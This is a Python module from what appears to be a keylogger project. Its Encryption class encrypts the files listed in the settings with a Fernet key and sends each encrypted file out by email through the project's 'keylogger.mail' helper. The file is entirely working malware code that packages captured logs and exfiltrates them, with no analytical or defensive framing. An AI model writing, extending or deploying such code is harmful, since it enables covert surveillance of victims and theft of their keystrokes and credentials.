from cryptography.fernet import Fernet
from time import sleep
import os

from keylogger.mail import send_email
from settings import key_filename, filenames
from cryptography.KeyGenerator import KeyGenerator


class Encryption:
    def __init__(self, file_path):
        self.path = file_path
        self.file_path = file_path + "\\"

        self.key = self.get_key()

        self.files_to_encrypt = []
        self.encrypted_file_names = []

        for _, filename in filenames.items():
            self.files_to_encrypt.append(self.file_path + filename)
            self.encrypted_file_names.append(self.file_path + filename + "_e")

        self.encrypt()

    def encrypt(self):
        for count, encrypting_file in enumerate(self.files_to_encrypt):
            with open(self.files_to_encrypt[count], 'rb') as f:
                data = f.read()

            fernet = Fernet(self.key)
            encrypted = fernet.encrypt(data)

            with open(self.encrypted_file_names[count], 'wb') as f:
                f.write(encrypted)

            send_email(self.encrypted_file_names[count], self.encrypted_file_names[count])

        sleep(120)

    def get_key(self):
        key_path = "\\".join([self.file_path, key_filename])
        if not os.path.isfile(key_path):
            KeyGenerator(self.file_path)
        with open(key_path, 'rb') as f:
            key = f.read()
        return key
